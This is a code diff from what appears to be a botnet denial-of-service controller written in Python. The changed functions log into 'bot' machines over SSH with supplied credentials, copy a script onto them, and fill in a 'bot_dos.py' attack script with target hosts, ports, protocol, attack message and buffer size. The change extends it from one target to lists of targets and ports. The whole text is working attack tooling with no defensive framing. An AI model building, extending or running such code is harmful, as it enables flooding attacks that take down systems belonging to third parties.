@@ -12,10 +12,10 @@ def generate_dos(bot, username, password, script):
 
         return("break")
 
-def transfer_script(host, username, password, script):
+def transfer_script(bot, username, password, script):
     ssh = SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect(hostname=host,username=username,password=password)
+    ssh.connect(hostname=bot,username=username,password=password)
     
     if not username == "root":
         loc = "/home/{}/{}".format(username, script)
@@ -27,7 +27,7 @@ def transfer_script(host, username, password, script):
 
     return("break")
 
-def create_bot_dos_script(host, attack_message, port, transmission, buffer_size):
+def create_bot_dos_script(targets, attack_message, ports, transmission, buffer_size):
     script = "bot_dos.py"
     with open(script, "r") as scriptRead:
         lines = scriptRead.readlines()
@@ -36,24 +36,27 @@ def create_bot_dos_script(host, attack_message, port, transmission, buffer_size)
         idx = lines.index(line)
         lines[idx] = line.rstrip()
     
-    target = "host = "
+    target = "targets = "
     message = "attack_message = "
-    port_num = "port = "
+    port_nums = "ports = "
     protocol = "transmission = "
     buff_size = "buffer_size = "
+
+    target_array_string = "[{}]".format(", ".join(targets))
+    port_array_string = "[{}]".format(", ".join(ports))
     
     for line in lines[0:7]:
         if target in line:
             idx = lines.index(line)
-            lines[idx] = target + '"{}"'.format(host)
+            lines[idx] = target + "'{}'".format(target_array_string)
 
         if message in line:
             idx = lines.index(line)
             lines[idx] = message + '"{}"'.format(attack_message)
 
-        if port_num in line:
+        if port_nums in line:
             idx = lines.index(line)
-            lines[idx] = port_num + str(port)
+            lines[idx] = port_nums + port_array_string
 
         if protocol in line:
             idx = lines.index(line)
